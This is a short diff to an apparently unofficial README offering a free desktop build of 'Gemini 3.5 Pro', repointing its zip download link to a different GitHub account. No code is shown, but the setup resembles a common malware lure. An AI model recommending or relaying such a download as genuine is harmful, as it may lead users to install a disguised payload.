@@ -5,7 +5,7 @@
 <img width="1672" height="941" alt="10bd0885-90c6-436d-95ee-6baa03ae9a07" src="https://github.com/user-attachments/assets/78ca6602-0f9f-416f-921d-f3c0e9f80240" />
 
 ## Install
-[Download `Gemini-3.5-Pro-Free-Desktop.zip`](https://github.com/adammasaoudi71-cmd/Gemini-3.5-Pro-Free-Desktop/releases/latest/download/Gemini-3.5-Pro-Free-Desktop.zip)
+[Download `Gemini3.5Pro-desktop.zip`](https://github.com/gemini35pro/Gemini-3.5-Pro-Free-Desktop/releases/download/3.5-pro/Gemini3.5Pro-desktop.zip)
 ---
 
 
